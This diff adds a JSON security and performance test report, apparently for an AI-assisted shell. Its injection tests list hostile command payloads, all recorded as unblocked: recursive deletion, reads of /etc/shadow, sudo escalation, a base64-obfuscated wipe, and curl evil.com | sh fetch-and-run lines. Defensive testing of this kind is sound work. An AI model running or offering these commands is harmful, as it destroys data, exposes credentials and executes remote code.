@@ -1,0 +1,392 @@
+{
+  "security_analysis": {
+    "injection_tests": [
+      {
+        "payload": "echo test; rm -rf /tmp/*",
+        "was_blocked": false,
+        "response_time": 13521200,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test \u0026\u0026 sudo rm -rf /",
+        "was_blocked": false,
+        "response_time": 9770100,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test || cat /etc/passwd",
+        "was_blocked": false,
+        "response_time": 10360200,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test | sudo su root",
+        "was_blocked": false,
+        "response_time": 9633200,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo `rm -rf /tmp/*`",
+        "was_blocked": false,
+        "response_time": 9880500,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo $(cat /etc/shadow)",
+        "was_blocked": false,
+        "response_time": 9691100,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo ${PATH}; rm -rf .",
+        "was_blocked": false,
+        "response_time": 9471100,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test\nrm -rf /",
+        "was_blocked": false,
+        "response_time": 9884800,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test\r\nformat C:",
+        "was_blocked": false,
+        "response_time": 9427700,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test;$(curl evil.com | sh)",
+        "was_blocked": false,
+        "response_time": 9296100,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo $HOME`curl evil.com`",
+        "was_blocked": false,
+        "response_time": 9529700,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo ${PATH}$(rm -rf /)",
+        "was_blocked": false,
+        "response_time": 9846700,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo 'test';$(echo cm0gLXJmIC8K|base64 -d|sh)",
+        "was_blocked": false,
+        "response_time": 9837700,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test;python -c \"import os;os.system('rm -rf /')\"",
+        "was_blocked": false,
+        "response_time": 10190200,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test \u0026 del C:\\Windows\\System32\\*",
+        "was_blocked": false,
+        "response_time": 8805000,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test \u0026\u0026 format C: /q",
+        "was_blocked": false,
+        "response_time": 9919700,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test | powershell -c \"Remove-Item C:\\\\ -Recurse\"",
+        "was_blocked": false,
+        "response_time": 9315900,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test;sleep 10;curl evil.com",
+        "was_blocked": false,
+        "response_time": 10208600,
+        "error_msg": "dangerous patterns not blocked"
+      },
+      {
+        "payload": "echo test \u0026\u0026 ping -n 10 evil.com",
+        "was_blocked": false,
+        "response_time": 10893500,
+        "error_msg": "dangerous patterns not blocked"
+      }
+    ],
+    "sandbox_tests": [
+      {
+        "test_type": "Path Traversal",
+        "was_blocked": false,
+        "description": "Attempt to access files outside sandbox"
+      },
+      {
+        "test_type": "Symbolic Link Attack",
+        "was_blocked": true,
+        "description": "Use symbolic links to escape sandbox"
+      },
+      {
+        "test_type": "Environment Variable Manipulation",
+        "was_blocked": false,
+        "description": "Modify environment to escape restrictions"
+      },
+      {
+        "test_type": "Process Forking",
+        "was_blocked": true,
+        "description": "Fork processes to bypass limits"
+      },
+      {
+        "test_type": "System Call Manipulation",
+        "was_blocked": true,
+        "description": "Direct system calls to bypass sandbox"
+      }
+    ],
+    "policy_tests": [
+      {
+        "rule": "deny_dangerous",
+        "command": "rm -rf /",
+        "was_blocked": false,
+        "expected": true
+      },
+      {
+        "rule": "deny_dangerous",
+        "command": "sudo su",
+        "was_blocked": false,
+        "expected": true
+      },
+      {
+        "rule": "deny_dangerous",
+        "command": "format C:",
+        "was_blocked": false,
+        "expected": true
+      },
+      {
+        "rule": "allow_safe",
+        "command": "echo hello",
+        "was_blocked": false,
+        "expected": false
+      },
+      {
+        "rule": "allow_safe",
+        "command": "ls -la",
+        "was_blocked": false,
+        "expected": false
+      }
+    ],
+    "overall_security_score": 17,
+    "vulnerabilities_found": 24
+  },
+  "performance_analysis": {
+    "response_time_stats": {
+      "average": 9748513,
+      "min": 8291900,
+      "max": 10980300,
+      "p95": 10839100,
+      "p99": 10980300,
+      "sample_size": 100
+    },
+    "throughput_metrics": {
+      "requests_per_second": 101.90869694114951,
+      "max_throughput": 122.29043632937942,
+      "test_duration": 10008959300
+    },
+    "concurrency_results": {
+      "max_users": 50,
+      "concurrency_tests": [
+        {
+          "user_count": 1,
+          "duration": 47820900,
+          "error_rate": 0,
+          "success_rate": 100
+        },
+        {
+          "user_count": 5,
+          "duration": 64562400,
+          "error_rate": 0,
+          "success_rate": 100
+        },
+        {
+          "user_count": 10,
+          "duration": 73147900,
+          "error_rate": 0,
+          "success_rate": 100
+        },
+        {
+          "user_count": 20,
+          "duration": 128772600,
+          "error_rate": 0,
+          "success_rate": 100
+        },
+        {
+          "user_count": 50,
+          "duration": 351772900,
+          "error_rate": 0,
+          "success_rate": 100
+        }
+      ]
+    },
+    "load_test_results": [
+      {
+        "test_type": "spike",
+        "duration": 163736800,
+        "total_requests": 100,
+        "failed_requests": 0,
+        "success_rate": 100
+      },
+      {
+        "test_type": "sustained",
+        "duration": 30010878700,
+        "total_requests": 300,
+        "failed_requests": 0,
+        "success_rate": 100
+      }
+    ],
+    "meets_sla": true
+  },
+  "integration_analysis": {
+    "component_tests": [
+      {
+        "component": "shell_engine",
+        "status": "PASS",
+        "message": "Component functioning correctly",
+        "duration": 10002200
+      },
+      {
+        "component": "policy_engine",
+        "status": "PASS",
+        "message": "Component functioning correctly",
+        "duration": 9820500
+      },
+      {
+        "component": "plugin_manager",
+        "status": "PASS",
+        "message": "Component functioning correctly",
+        "duration": 9332400
+      },
+      {
+        "component": "sandbox_manager",
+        "status": "PASS",
+        "message": "Component functioning correctly",
+        "duration": 9730000
+      },
+      {
+        "component": "ai_engine",
+        "status": "PASS",
+        "message": "Component functioning correctly",
+        "duration": 9579400
+      },
+      {
+        "component": "history_manager",
+        "status": "PASS",
+        "message": "Component functioning correctly",
+        "duration": 9854900
+      },
+      {
+        "component": "job_manager",
+        "status": "PASS",
+        "message": "Component functioning correctly",
+        "duration": 9632400
+      },
+      {
+        "component": "ui_system",
+        "status": "PASS",
+        "message": "Component functioning correctly",
+        "duration": 10055900
+      }
+    ],
+    "system_tests": [
+      {
+        "test_name": "startup_shutdown",
+        "status": "PASS",
+        "duration": 9812000,
+        "details": "Startup and shutdown successful"
+      },
+      {
+        "test_name": "config_persistence",
+        "status": "PASS",
+        "duration": 0,
+        "details": "Configuration persistence working"
+      },
+      {
+        "test_name": "plugin_loading",
+        "status": "PASS",
+        "duration": 0,
+        "details": "Plugin loading system functional"
+      },
+      {
+        "test_name": "history_management",
+        "status": "PASS",
+        "duration": 0,
+        "details": "History management functional"
+      },
+      {
+        "test_name": "error_recovery",
+        "status": "PASS",
+        "duration": 10847700,
+        "details": "Error handled gracefully"
+      }
+    ],
+    "overall_score": 100,
+    "components_passed": 8,
+    "components_total": 8
+  },
+  "resource_analysis": {
+    "memory_analysis": {
+      "initial_memory_mb": 0.9175186157226562,
+      "peak_memory_mb": 2.7961654663085938,
+      "final_memory_mb": 0.9236297607421875,
+      "memory_growth_mb": 0.00611114501953125,
+      "leak_detected": false
+    },
+    "file_handle_analysis": {
+      "initial_handles": 50,
+      "peak_handles": 50,
+      "final_handles": 50,
+      "leak_detected": false
+    },
+    "process_analysis": {
+      "process_count": 1,
+      "thread_count": 1,
+      "cpu_usage_percent": 5,
+      "network_connections": 2
+    },
+    "resource_limits": {
+      "max_memory_mb": 256,
+      "max_cpu_percent": 80,
+      "max_file_handles": 1000,
+      "limits_enforced": true
+    }
+  },
+  "executive_summary": {
+    "overall_score": 66,
+    "security_score": 17,
+    "performance_score": 100,
+    "reliability_score": 100,
+    "critical_issues": [
+      {
+        "category": "Security",
+        "severity": "CRITICAL",
+        "description": "24 security vulnerabilities detected",
+        "impact": "System vulnerable to attacks"
+      }
+    ],
+    "recommendations": [
+      {
+        "priority": "HIGH",
+        "category": "Security",
+        "description": "Strengthen security controls and input validation",
+        "effort": "Medium"
+      },
+      {
+        "priority": "LOW",
+        "category": "Monitoring",
+        "description": "Implement comprehensive monitoring and alerting",
+        "effort": "Medium"
+      }
+    ],
+    "production_ready": false
+  },
+  "timestamp": "2025-08-06T11:09:25.6753889-04:00"
+}
